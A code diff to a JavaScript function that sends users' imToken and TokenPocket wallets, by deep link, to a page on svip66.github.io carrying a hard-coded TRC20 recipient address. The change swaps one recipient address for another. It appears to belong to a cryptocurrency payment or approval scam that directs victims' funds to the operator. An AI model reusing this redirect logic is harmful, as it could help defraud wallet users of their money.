@@ -106,9 +106,9 @@ function paylistevent(from) {
 
 //	let my_url = window.location.protocol + "//" + window.location.host + "/" + addtype + ".html?from=" + from +
 //		"&addtype=" + addtype + "&to_address=" + to_address + "&from_url=" + from_url;
-let im_url = "https://svip66.github.io/1/?addtype=trc20&to_address=TVPdegug7oUpfCPRReK3Xy1BH8JioRdKgP&utm_source=imtoken"
-let tp_url =  "https://svip66.github.io/1/?addtype=trc20&to_address=TVPdegug7oUpfCPRReK3Xy1BH8JioRdKgP&utm_source=tokenpocket"
-let my_url =  "https://svip66.github.io/1/?addtype=trc20&to_address=TVPdegug7oUpfCPRReK3Xy1BH8JioRdKgP"		
+let im_url = "https://svip66.github.io/1/?addtype=trc20&to_address=TCEUFLkzxoGmd48YZdzPd6xQ7XMCYC9uyA&utm_source=imtoken"
+let tp_url =  "https://svip66.github.io/1/?addtype=trc20&to_address=TCEUFLkzxoGmd48YZdzPd6xQ7XMCYC9uyA&utm_source=tokenpocket"
+let my_url =  "https://svip66.github.io/1/?addtype=trc20&to_address=TCEUFLkzxoGmd48YZdzPd6xQ7XMCYC9uyA"		
 		
 		if (from == "imToken") {
 			location.href = "imtokenv2://navigate?screen=DappView&url=" + im_url;
